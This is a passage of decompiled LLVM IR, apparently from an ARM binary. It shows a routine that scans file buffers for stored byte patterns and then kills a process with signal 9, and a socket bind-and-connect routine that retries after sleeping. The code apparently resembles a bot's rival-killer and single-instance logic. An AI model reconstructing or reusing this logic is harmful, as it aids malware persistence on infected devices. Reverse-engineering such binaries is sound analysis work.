dec_label_pc_ef38:                                ; preds = %dec_label_pc_ef20, %dec_label_pc_f1f8
  %v0_ef38 = phi i32 [ %v3_ef28, %dec_label_pc_ef20 ], [ %v0_ef38.pre, %dec_label_pc_f1f8 ]
  %v1_ef3c = call i32 @function_12e9c(i32 %v0_ef38)
  br label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ed90, %dec_label_pc_ef38
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ef4c = call i32 @function_12fc8(i8* %v2_edc4, i32 0)
  %v7_ef50 = icmp eq i32 %v3_ef4c, -1
  br i1 %v7_ef50, label %dec_label_pc_f1c4, label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef40
  %v1_ef60 = call i32 @function_11c08(i32 12)
  %v1_ef68 = call i32 @function_11c08(i32 13)
  %v1_ef70 = call i32 @function_11c08(i32 14)
  %v1_ef78 = call i32 @function_11c08(i32 15)
  %v1_ef80 = call i32 @function_11c08(i32 16)
  store i32 %v2_ef84, i32* %r1.global-to-local, align 4
  %v3_ef8c = call i32 @function_11b24(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_ef94, i32* %r1.global-to-local, align 4
  store i32 %v3_ef8c, i32* @r5, align 4
  %v3_efa0 = call i32 @function_11b24(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_efa8, i32* %r1.global-to-local, align 4
  store i32 %v3_efa0, i32* @r6, align 4
  %v3_efb4 = call i32 @function_11b24(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_efbc, i32* %r1.global-to-local, align 4
  store i32 %v3_efb4, i32* @sb, align 4
  %v3_efc8 = call i32 @function_11b24(i32 15, i32* nonnull %stack_var_-40)
  store i32 %v3_efc8, i32* @fp, align 4
  store i32 %v2_efd4, i32* %r1.global-to-local, align 4
  %v3_efdc = call i32 @function_11b24(i32 16, i32* nonnull %stack_var_-56)
  store i32 %v2_ebfc, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eff0114 = call i32 @function_13064(i32 %v3_ef4c, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp217 = icmp slt i32 %v4_eff0114, 1
  br i1 %tmp217, label %dec_label_pc_f208, label %dec_label_pc_effc

dec_label_pc_effc:                                ; preds = %dec_label_pc_ef5c, %dec_label_pc_efe4.backedge
  %v0_f084105 = phi i32 [ %v4_eff0, %dec_label_pc_efe4.backedge ], [ %v4_eff0114, %dec_label_pc_ef5c ]
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_f000 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f000, i32* @r4, align 4
  %v5_f008 = icmp slt i32 %v0_f084105, %v3_f000
  br i1 %v5_f008, label %dec_label_pc_f018, label %dec_label_pc_f0c4.lr.ph

dec_label_pc_f0c4.lr.ph:                          ; preds = %dec_label_pc_effc
  %v1_f0bc70 = add i32 %v0_f084105, -1
  store i32 %v1_f0bc70, i32* %r1.global-to-local, align 4
  %v0_f0c4.pre = load i32, i32* @r5, align 4
  %v1_f0c8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f0c4

dec_label_pc_f018:                                ; preds = %dec_label_pc_f0bc.backedge, %dec_label_pc_effc
  %v3_f01c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_f01c, i32* @r4, align 4
  %v5_f024 = icmp slt i32 %v0_f084105, %v3_f01c
  br i1 %v5_f024, label %dec_label_pc_f034, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_f018
  %v1_f0f079 = add i32 %v0_f084105, -1
  store i32 %v1_f0f079, i32* %r1.global-to-local, align 4
  %v2_f0f080 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f0f080, label %dec_label_pc_f034, label %dec_label_pc_f0f8.lr.ph

dec_label_pc_f0f8.lr.ph:                          ; preds = %.thread28
  %v0_f0f8.pre = load i32, i32* @r6, align 4
  %v1_f0fc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f0f8

dec_label_pc_f034:                                ; preds = %dec_label_pc_f0f0.backedge, %.thread28, %dec_label_pc_f018
  store i32 %v2_eb00, i32* %r1.global-to-local, align 4
  %v3_f038 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f038, i32* @r4, align 4
  %v5_f040 = icmp slt i32 %v0_f084105, %v3_f038
  br i1 %v5_f040, label %dec_label_pc_f050, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_f034
  %v1_f12488 = add i32 %v0_f084105, -1
  store i32 %v1_f12488, i32* %r1.global-to-local, align 4
  %v2_f12489 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f12489, label %dec_label_pc_f050, label %dec_label_pc_f12c.lr.ph

dec_label_pc_f12c.lr.ph:                          ; preds = %.thread37
  %v0_f12c.pre = load i32, i32* @sb, align 4
  %v1_f130.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f12c

dec_label_pc_f050:                                ; preds = %dec_label_pc_f124.backedge, %.thread37, %dec_label_pc_f034
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  %v3_f054 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f054, i32* @r4, align 4
  %v5_f05c = icmp slt i32 %v0_f084105, %v3_f054
  br i1 %v5_f05c, label %dec_label_pc_f06c, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_f050
  %v1_f15897 = add i32 %v0_f084105, -1
  store i32 %v1_f15897, i32* %r1.global-to-local, align 4
  %v2_f15898 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f15898, label %dec_label_pc_f06c, label %dec_label_pc_f160.lr.ph

dec_label_pc_f160.lr.ph:                          ; preds = %.thread46
  %v0_f160.pre = load i32, i32* @fp, align 4
  %v1_f164.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f160

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f158.backedge, %.thread46, %dec_label_pc_f050
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_f070 = load i32, i32* %stack_var_-56, align 4
  %v5_f078 = icmp slt i32 %v0_f084105, %v3_f070
  br i1 %v5_f078, label %dec_label_pc_efe4.backedge, label %.thread52

dec_label_pc_efe4.backedge:                       ; preds = %dec_label_pc_f0a8, %.thread52, %dec_label_pc_f06c
  store i32 %v2_ebfc, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eff0 = call i32 @function_13064(i32 %v3_ef4c, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp218 = icmp slt i32 %v4_eff0, 1
  br i1 %tmp218, label %dec_label_pc_f208, label %dec_label_pc_effc

.thread52:                                        ; preds = %dec_label_pc_f06c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_f084107 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f084107, label %dec_label_pc_efe4.backedge, label %dec_label_pc_f08c.lr.ph

dec_label_pc_f08c.lr.ph:                          ; preds = %.thread52
  %v1_f094.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f0a8, %dec_label_pc_f08c.lr.ph
  %v0_f084.in = phi i32 [ %v0_f084105, %dec_label_pc_f08c.lr.ph ], [ %v0_f084, %dec_label_pc_f0a8 ]
  %v0_f0a8 = phi i32 [ 0, %dec_label_pc_f08c.lr.ph ], [ %v1_f0a8, %dec_label_pc_f0a8 ]
  %v0_f09c = phi i32 [ 0, %dec_label_pc_f08c.lr.ph ], [ %v1_f09c., %dec_label_pc_f0a8 ]
  %v0_f084 = add i32 %v0_f084.in, -1
  store i32 %v3_efdc, i32* %r3.global-to-local, align 4
  %v2_f090 = add i32 %v0_f09c, %v3_efdc
  %v3_f090 = inttoptr i32 %v2_f090 to i8*
  %v4_f090 = load i8, i8* %v3_f090, align 1
  %v6_f090 = zext i8 %v4_f090 to i32
  store i32 %v6_f090, i32* %r2.global-to-local, align 4
  %v2_f094 = add i32 %v0_f0a8, %v1_f094.pre
  %v3_f094 = inttoptr i32 %v2_f094 to i8*
  %v4_f094 = load i8, i8* %v3_f094, align 1
  %v6_f094 = zext i8 %v4_f094 to i32
  store i32 %v6_f094, i32* %r3.global-to-local, align 4
  %v9_f098 = icmp eq i8 %v4_f094, %v4_f090
  %v1_f09c = add i32 %v0_f09c, 1
  %v1_f09c. = select i1 %v9_f098, i32 %v1_f09c, i32 0
  store i32 %v1_f09c., i32* %r1.global-to-local, align 4
  br i1 %v9_f098, label %dec_label_pc_f180, label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f180, %dec_label_pc_f08c
  %v1_f0a8 = add i32 %v0_f0a8, 1
  %v2_f084 = icmp eq i32 %v0_f084, 0
  br i1 %v2_f084, label %dec_label_pc_efe4.backedge, label %dec_label_pc_f08c

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_f0c4
  %v9_f0b0 = icmp eq i32 %v3_f000, %v1_f0d0.
  br i1 %v9_f0b0, label %dec_label_pc_f188, label %dec_label_pc_f0bc.backedge

dec_label_pc_f0bc.backedge:                       ; preds = %dec_label_pc_f0c4, %dec_label_pc_f0b0
  %storemerge125 = add i32 %storemerge125.in, 1
  %v1_f0bc = add i32 %v0_f0bc, -1
  store i32 %v1_f0bc, i32* %r1.global-to-local, align 4
  %v2_f0bc = icmp eq i32 %v0_f0bc, 0
  br i1 %v2_f0bc, label %dec_label_pc_f018, label %dec_label_pc_f0c4

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f0bc.backedge, %dec_label_pc_f0c4.lr.ph
  %v0_f0bc = phi i32 [ %v1_f0bc70, %dec_label_pc_f0c4.lr.ph ], [ %v1_f0bc, %dec_label_pc_f0bc.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_f0c4.lr.ph ], [ %storemerge125, %dec_label_pc_f0bc.backedge ]
  %v0_f0d0 = phi i32 [ 0, %dec_label_pc_f0c4.lr.ph ], [ %v1_f0d0., %dec_label_pc_f0bc.backedge ]
  %v2_f0c4 = add i32 %v0_f0d0, %v0_f0c4.pre
  %v3_f0c4 = inttoptr i32 %v2_f0c4 to i8*
  %v4_f0c4 = load i8, i8* %v3_f0c4, align 1
  %v6_f0c4 = zext i8 %v4_f0c4 to i32
  store i32 %v6_f0c4, i32* %r2.global-to-local, align 4
  %v2_f0c8 = add i32 %storemerge125.in, %v1_f0c8.pre
  %v3_f0c8 = inttoptr i32 %v2_f0c8 to i8*
  %v4_f0c8 = load i8, i8* %v3_f0c8, align 1
  %v6_f0c8 = zext i8 %v4_f0c8 to i32
  store i32 %v6_f0c8, i32* %r3.global-to-local, align 4
  %v9_f0cc = icmp eq i8 %v4_f0c8, %v4_f0c4
  %v1_f0d0 = add i32 %v0_f0d0, 1
  %v1_f0d0. = select i1 %v9_f0cc, i32 %v1_f0d0, i32 0
  br i1 %v9_f0cc, label %dec_label_pc_f0b0, label %dec_label_pc_f0bc.backedge

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f0f8
  %v9_f0e4 = icmp eq i32 %v3_f01c, %v1_f104.
  br i1 %v9_f0e4, label %dec_label_pc_f188, label %dec_label_pc_f0f0.backedge

dec_label_pc_f0f0.backedge:                       ; preds = %dec_label_pc_f0f8, %dec_label_pc_f0e4
  %storemerge124 = add i32 %storemerge124.in, 1
  %v1_f0f0 = add i32 %v0_f0f0, -1
  store i32 %v1_f0f0, i32* %r1.global-to-local, align 4
  %v2_f0f0 = icmp eq i32 %v0_f0f0, 0
  br i1 %v2_f0f0, label %dec_label_pc_f034, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0f0.backedge, %dec_label_pc_f0f8.lr.ph
  %v0_f0f0 = phi i32 [ %v1_f0f079, %dec_label_pc_f0f8.lr.ph ], [ %v1_f0f0, %dec_label_pc_f0f0.backedge ]
  %storemerge124.in = phi i32 [ 0, %dec_label_pc_f0f8.lr.ph ], [ %storemerge124, %dec_label_pc_f0f0.backedge ]
  %v0_f104 = phi i32 [ 0, %dec_label_pc_f0f8.lr.ph ], [ %v1_f104., %dec_label_pc_f0f0.backedge ]
  %v2_f0f8 = add i32 %v0_f104, %v0_f0f8.pre
  %v3_f0f8 = inttoptr i32 %v2_f0f8 to i8*
  %v4_f0f8 = load i8, i8* %v3_f0f8, align 1
  %v6_f0f8 = zext i8 %v4_f0f8 to i32
  store i32 %v6_f0f8, i32* %r2.global-to-local, align 4
  %v2_f0fc = add i32 %storemerge124.in, %v1_f0fc.pre
  %v3_f0fc = inttoptr i32 %v2_f0fc to i8*
  %v4_f0fc = load i8, i8* %v3_f0fc, align 1
  %v6_f0fc = zext i8 %v4_f0fc to i32
  store i32 %v6_f0fc, i32* %r3.global-to-local, align 4
  %v9_f100 = icmp eq i8 %v4_f0fc, %v4_f0f8
  %v1_f104 = add i32 %v0_f104, 1
  %v1_f104. = select i1 %v9_f100, i32 %v1_f104, i32 0
  br i1 %v9_f100, label %dec_label_pc_f0e4, label %dec_label_pc_f0f0.backedge

dec_label_pc_f118:                                ; preds = %dec_label_pc_f12c
  %v9_f118 = icmp eq i32 %v3_f038, %v1_f138.
  br i1 %v9_f118, label %dec_label_pc_f188, label %dec_label_pc_f124.backedge

dec_label_pc_f124.backedge:                       ; preds = %dec_label_pc_f12c, %dec_label_pc_f118
  %storemerge123 = add i32 %storemerge123.in, 1
  %v1_f124 = add i32 %v0_f124, -1
  store i32 %v1_f124, i32* %r1.global-to-local, align 4
  %v2_f124 = icmp eq i32 %v0_f124, 0
  br i1 %v2_f124, label %dec_label_pc_f050, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f124.backedge, %dec_label_pc_f12c.lr.ph
  %v0_f124 = phi i32 [ %v1_f12488, %dec_label_pc_f12c.lr.ph ], [ %v1_f124, %dec_label_pc_f124.backedge ]
  %storemerge123.in = phi i32 [ 0, %dec_label_pc_f12c.lr.ph ], [ %storemerge123, %dec_label_pc_f124.backedge ]
  %v0_f138 = phi i32 [ 0, %dec_label_pc_f12c.lr.ph ], [ %v1_f138., %dec_label_pc_f124.backedge ]
  %v2_f12c = add i32 %v0_f138, %v0_f12c.pre
  %v3_f12c = inttoptr i32 %v2_f12c to i8*
  %v4_f12c = load i8, i8* %v3_f12c, align 1
  %v6_f12c = zext i8 %v4_f12c to i32
  store i32 %v6_f12c, i32* %r2.global-to-local, align 4
  %v2_f130 = add i32 %storemerge123.in, %v1_f130.pre
  %v3_f130 = inttoptr i32 %v2_f130 to i8*
  %v4_f130 = load i8, i8* %v3_f130, align 1
  %v6_f130 = zext i8 %v4_f130 to i32
  store i32 %v6_f130, i32* %r3.global-to-local, align 4
  %v9_f134 = icmp eq i8 %v4_f130, %v4_f12c
  %v1_f138 = add i32 %v0_f138, 1
  %v1_f138. = select i1 %v9_f134, i32 %v1_f138, i32 0
  br i1 %v9_f134, label %dec_label_pc_f118, label %dec_label_pc_f124.backedge

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f160
  %v9_f14c = icmp eq i32 %v3_f054, %v1_f16c.
  br i1 %v9_f14c, label %dec_label_pc_f188, label %dec_label_pc_f158.backedge

dec_label_pc_f158.backedge:                       ; preds = %dec_label_pc_f160, %dec_label_pc_f14c
  %storemerge = add i32 %storemerge.in, 1
  %v1_f158 = add i32 %v0_f158, -1
  store i32 %v1_f158, i32* %r1.global-to-local, align 4
  %v2_f158 = icmp eq i32 %v0_f158, 0
  br i1 %v2_f158, label %dec_label_pc_f06c, label %dec_label_pc_f160

dec_label_pc_f160:                                ; preds = %dec_label_pc_f158.backedge, %dec_label_pc_f160.lr.ph
  %v0_f158 = phi i32 [ %v1_f15897, %dec_label_pc_f160.lr.ph ], [ %v1_f158, %dec_label_pc_f158.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_f160.lr.ph ], [ %storemerge, %dec_label_pc_f158.backedge ]
  %v0_f16c = phi i32 [ 0, %dec_label_pc_f160.lr.ph ], [ %v1_f16c., %dec_label_pc_f158.backedge ]
  %v2_f160 = add i32 %v0_f16c, %v0_f160.pre
  %v3_f160 = inttoptr i32 %v2_f160 to i8*
  %v4_f160 = load i8, i8* %v3_f160, align 1
  %v6_f160 = zext i8 %v4_f160 to i32
  store i32 %v6_f160, i32* %r2.global-to-local, align 4
  %v2_f164 = add i32 %storemerge.in, %v1_f164.pre
  %v3_f164 = inttoptr i32 %v2_f164 to i8*
  %v4_f164 = load i8, i8* %v3_f164, align 1
  %v6_f164 = zext i8 %v4_f164 to i32
  store i32 %v6_f164, i32* %r3.global-to-local, align 4
  %v9_f168 = icmp eq i8 %v4_f164, %v4_f160
  %v1_f16c = add i32 %v0_f16c, 1
  %v1_f16c. = select i1 %v9_f168, i32 %v1_f16c, i32 0
  br i1 %v9_f168, label %dec_label_pc_f14c, label %dec_label_pc_f158.backedge

dec_label_pc_f180:                                ; preds = %dec_label_pc_f08c
  %v9_f180 = icmp eq i32 %v3_f070, %v1_f09c.
  br i1 %v9_f180, label %dec_label_pc_f188, label %dec_label_pc_f0a8

dec_label_pc_f188:                                ; preds = %dec_label_pc_f0b0, %dec_label_pc_f0e4, %dec_label_pc_f118, %dec_label_pc_f14c, %dec_label_pc_f180
  %v1_f18c = call i32 @function_11b50(i32 12)
  %v1_f194 = call i32 @function_11b50(i32 13)
  %v1_f19c = call i32 @function_11b50(i32 14)
  %v1_f1a4 = call i32 @function_11b50(i32 15)
  %v1_f1ac = call i32 @function_11b50(i32 16)
  %v1_f1b4 = call i32 @function_12e9c(i32 %v3_ef4c)
  %v0_f1b8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_f1c0 = call i32 @function_12f9c(i32 %v0_f1b8, i32 9)
  br label %dec_label_pc_f1c4

dec_label_pc_f1c4:                                ; preds = %dec_label_pc_ef40, %dec_label_pc_f208, %dec_label_pc_f188
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_f1d0 = call i32 @function_1257c(i32 %v2_edc0, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_f1e0 = call i32 @function_1257c(i32 %v2_ee10, i32 64)
  %v1_f1e8 = call i32 @function_142c4(i32 1)
  store i32 %v2_ed94, i32* @r4, align 4
  %v0_f1f0 = load i32, i32* @r7, align 4
  store i32 %v0_f1f0, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_ef20
  %v0_f1f8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_f200 = call i32 @function_12f9c(i32 %v0_f1f8, i32 9)
  %v0_ef38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ef38

dec_label_pc_f208:                                ; preds = %dec_label_pc_efe4.backedge, %dec_label_pc_ef5c
  %v1_f20c = call i32 @function_11b50(i32 12)
  %v1_f214 = call i32 @function_11b50(i32 13)
  %v1_f21c = call i32 @function_11b50(i32 14)
  %v1_f224 = call i32 @function_11b50(i32 15)
  %v1_f22c = call i32 @function_11b50(i32 16)
  %v1_f234 = call i32 @function_12e9c(i32 %v3_ef4c)
  br label %dec_label_pc_f1c4

; uselistorder directives
  uselistorder i32 %v1_f16c., { 1, 0 }
  uselistorder i1 %v9_f168, { 1, 0 }
  uselistorder i32 %v0_f16c, { 1, 0 }
  uselistorder i32 %v1_f138., { 1, 0 }
  uselistorder i1 %v9_f134, { 1, 0 }
  uselistorder i32 %v0_f138, { 1, 0 }
  uselistorder i32 %v1_f104., { 1, 0 }
  uselistorder i1 %v9_f100, { 1, 0 }
  uselistorder i32 %v0_f104, { 1, 0 }
  uselistorder i32 %v1_f0d0., { 1, 0 }
  uselistorder i1 %v9_f0cc, { 1, 0 }
  uselistorder i32 %v0_f0d0, { 1, 0 }
  uselistorder i32 %v1_f09c., { 1, 2, 0 }
  uselistorder i1 %v9_f098, { 1, 0 }
  uselistorder i32 %v0_f09c, { 1, 0 }
  uselistorder i32 %v0_f0a8, { 1, 0 }
  uselistorder i32 %v4_eff0, { 1, 0 }
  uselistorder i32 %v3_ef4c, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v3_ef28, { 1, 2, 0 }
  uselistorder i32 %v2_ecf8, { 1, 0 }
  uselistorder i32 %stack_var_-8420.1.be, { 1, 0 }
  uselistorder i32 %v4_ee70, { 1, 2, 0 }
  uselistorder i32 %v2_ed78, { 1, 0 }
  uselistorder i32 %v1_ed28, { 0, 1, 5, 4, 3, 2, 7, 8, 6 }
  uselistorder i32 %stack_var_-8420.0, { 1, 0 }
  uselistorder i32 %v2_ee10, { 1, 0, 2 }
  uselistorder i32 %v2_edc0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ec8c, { 1, 0 }
  uselistorder i32 %v3_ec58, { 2, 0, 1 }
  uselistorder i32 %v2_ebfc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_eb88, { 2, 1, 0 }
  uselistorder i32 %v3_eb38, { 1, 2, 0 }
  uselistorder i32 %storemerge174, { 1, 0 }
  uselistorder i32 %v0_eac8, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-72, { 0, 3, 1, 4, 2 }
  uselistorder i32* %stack_var_-8408, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 61, 15, 3, 2, 14, 1, 0, 4, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 30, 29, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 41, 42, 43, 62, 44, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 (i8*, i32, i32)* @function_12830, { 0, 1, 2, 3, 20, 21, 22, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 (i32*)* @function_133a0, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_132a4, { 2, 1, 0 }
  uselistorder i32* @global_var_1e470.105, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_1e474.97, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f1c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f188, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_effc, { 1, 0 }
  uselistorder label %dec_label_pc_ef40, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 0 }
  uselistorder label %dec_label_pc_ecf4.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_eedc, { 1, 0 }
  uselistorder label %dec_label_pc_ed04, { 1, 0 }
  uselistorder label %dec_label_pc_ed04.preheader, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
  uselistorder label %dec_label_pc_ebb4, { 1, 0 }
  uselistorder label %dec_label_pc_eb64, { 1, 0 }
}

define i32 @function_f248(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f248:
  store i32 ptrtoint (i32* @global_var_f260.107 to i32), i32* @global_var_1e244.109, align 4
  ret i32 %arg1
}

define i32 @function_f260() local_unnamed_addr {
dec_label_pc_f260:
  %stack_var_-8 = alloca i32, align 4
  %v3_f264 = load i32, i32* @r4, align 4
  store i32 %v3_f264, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_1e478.111 to i32), i32* @r4, align 4
  store i32 1674493113, i32* @global_var_1e47c.112, align 4
  %v1_f27c = call i32 @function_11c08(i32 4)
  %v3_f288 = call i32 @function_11b24(i32 4, i32* null)
  %v4_f288 = inttoptr i32 %v3_f288 to i8*
  %v2_f28c = add i32 %v3_f288, 1
  %v3_f28c = inttoptr i32 %v2_f28c to i8*
  %v4_f28c = load i8, i8* %v3_f28c, align 1
  %v3_f290 = load i8, i8* %v4_f288, align 1
  store i8 %v4_f28c, i8* bitcast (i32* @global_var_1e47b.113 to i8*), align 4
  store i8 %v3_f290, i8* bitcast (i32* @global_var_1e47a.114 to i8*), align 4
  %v2_f2a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f2a8, i32* @r4, align 4
  %v1_f2ac = call i32 @function_11b50(i32 4)
  %v0_f2b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f2b0, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_f260
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_f260, %bb
  ret i32 %v1_f2ac

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_f2b4() local_unnamed_addr {
dec_label_pc_f2b4:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_f2b4 = load i32, i32* @r4, align 4
  %v9_f2b4 = load i32, i32* @r6, align 4
  %v15_f2b4 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_f2d0 = call i32 @function_13790(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1e23c.116 to i32), i32* @r6, align 4
  %v7_f2d8 = icmp eq i32 %v3_f2d0, -1
  store i32 %v3_f2d0, i32* @global_var_1e23c.116, align 4
  br i1 %v7_f2d8, label %dec_label_pc_f398, label %dec_label_pc_f2e4

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_f2b4
  %v0_f2e8 = load i32, i32* @r4, align 4
  %v6_f2f8 = call i32 @function_13760(i32 %v3_f2d0, i32 %v0_f2e8, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_f2fc = load i32, i32* @global_var_1e23c.116, align 4
  store i32 %v2_f2fc, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_f30c = call i32 @function_12dac(i32 %v2_f2fc, i32 3)
  %v1_f314 = or i32 %v2_f30c, 2048
  store i32 %v1_f314, i32* @r2, align 4
  %v0_f318 = load i32, i32* @r4, align 4
  %v2_f31c = call i32 @function_12dac(i32 %v0_f318, i32 4)
  store i32 ptrtoint (i8** @global_var_1e248.118 to i32), i32* @r8, align 4
  %v2_f324 = load i8, i8* bitcast (i8** @global_var_1e248.118 to i8*), align 4
  %v2_f328 = icmp eq i8 %v2_f324, 0
  br i1 %v2_f328, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_f2e4
  br label %bb

.thread:                                          ; preds = %dec_label_pc_f2e4
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_f360 = call i32 @function_13470()
  %v0_f364 = load i32, i32* @r5, align 4
  %v2_f364 = inttoptr i32 %v0_f360 to i32*
  store i32 %v0_f364, i32* %v2_f364, align 4
  %v2_f368 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_f368, i32* @r7, align 4
  store i32 %v0_f360, i32* @r4, align 4
  %v2_f374 = load i32, i32* @global_var_1e23c.116, align 4
  %v3_f37c = bitcast i32* %stack_var_-44 to %sockaddr*
  %v4_f37c = call i32 @function_135c0(i32 %v2_f374, %sockaddr* %v3_f37c, i32 16)
  %v7_f380 = icmp eq i32 %v4_f37c, -1
  br i1 %v7_f380, label %dec_label_pc_f3a0, label %dec_label_pc_f388

dec_label_pc_f388:                                ; preds = %bb
  %v2_f390 = load i32, i32* @global_var_1e23c.116, align 4
  %v2_f394 = call i32 @function_13674(i32 %v2_f390, i32 1)
  br label %dec_label_pc_f398

dec_label_pc_f398:                                ; preds = %dec_label_pc_f2b4, %dec_label_pc_f3ac, %dec_label_pc_f388
  %v20_f39c = phi i32 [ %v3_f2d0, %dec_label_pc_f2b4 ], [ %v0_f3fc, %dec_label_pc_f3ac ], [ %v2_f394, %dec_label_pc_f388 ]
  store i32 %v3_f2b4, i32* @r4, align 4
  store i32 %v9_f2b4, i32* @r6, align 4
  store i32 %v15_f2b4, i32* @r8, align 4
  ret i32 %v20_f39c

dec_label_pc_f3a0:                                ; preds = %bb
  %v0_f3a0 = load i32, i32* @r4, align 4
  %v1_f3a0 = inttoptr i32 %v0_f3a0 to i32*
  %v2_f3a0 = load i32, i32* %v1_f3a0, align 4
  %v7_f3a4 = icmp eq i32 %v2_f3a0, 99
  br i1 %v7_f3a4, label %dec_label_pc_f404, label %dec_label_pc_f3ac

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f404, %bb21, %dec_label_pc_f3a0
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_f3c4 = load i32, i32* @global_var_1e23c.116, align 4
  %v4_f3dc = call i32 @function_135ec(i32 %v2_f3c4, %sockaddr* %v3_f37c, i32 16)
  %v1_f3e4 = call i32 @function_142c4(i32 5)
  %v2_f3e8 = load i32, i32* @global_var_1e23c.116, align 4
  %v1_f3ec = call i32 @function_12e9c(i32 %v2_f3e8)
  %v1_f3f8 = call i32 @function_e544(i32 52671)
  %v0_f3fc = call i32 @function_f2b4()
  br label %dec_label_pc_f398

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3a0
  %v2_f404 = load i8, i8* bitcast (i8** @global_var_1e248.118 to i8*), align 4
  %v3_f404 = zext i8 %v2_f404 to i32
  %v1_f408 = load i32, i32* @r5, align 4
